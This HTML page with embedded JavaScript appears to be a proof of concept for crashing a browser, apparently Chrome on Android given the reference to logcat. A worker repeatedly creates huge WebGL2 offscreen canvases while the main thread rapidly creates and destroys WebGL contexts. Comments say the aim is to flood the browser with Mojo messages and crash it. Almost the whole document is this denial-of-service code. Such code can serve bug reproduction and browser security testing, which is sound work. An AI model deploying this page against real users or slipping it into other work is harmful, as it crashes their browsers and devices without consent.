<html>
<body>
<pre id="log"></pre>
<script>
const log = msg => {
  document.getElementById('log').textContent += msg + '\n';
  console.log(msg);
};

(async function() {
  // 1. Start GPU crash in a Worker (YOUR ORIGINAL CRASH LOOP)
  const crashWorker = new Worker(URL.createObjectURL(new Blob([`
    (function() {
      const attrs = [
        { powerPreference: 'high-performance' },
        { powerPreference: 'low-power' },
        { desynchronized: true },
        { preserveDrawingBuffer: true },
        { failIfMajorPerformanceCaveat: false },
        { xrCompatible: true }
      ];
      for (let w = 1; w <= 16384; w *= 2) {
        for (let h = 1; h <= 16384; h *= 2) {
          for (const attr of attrs) {
            try {
              const canvas = new OffscreenCanvas(w, h);
              const gl = canvas.getContext('webgl2', attr);
              if (!gl) continue;
              gl.clear(gl.COLOR_BUFFER_BIT);
              gl.flush();
              canvas.width = 0;
              canvas.height = 0;
            } catch(e) {}
          }
        }
      }
      postMessage('crash_started');
    })();
  `], { type: 'application/javascript' })));

  // Wait for worker to start its loop
  await new Promise(r => { crashWorker.onmessage = r; });
  log('Crash loop started. Rapidly creating/destroying canvases...');

  // 2. On the main thread, rapid-fire create/destroy WebGL contexts
  //    This sends a flood of Mojo messages to the browser.
  for (let i = 0; i < 200; i++) {
    const c = document.createElement('canvas');
    c.width = c.height = 1;
    document.body.appendChild(c);
    const gl = c.getContext('webgl2', { preserveDrawingBuffer: true });
    if (gl) {
      // Immediately destroy it
      c.width = 0;
    }
    document.body.removeChild(c);
    // No delay – keep the IO thread busy
  }

  log('Finished. Check logcat for browser crash.');
})();
</script>
</body>
</html>
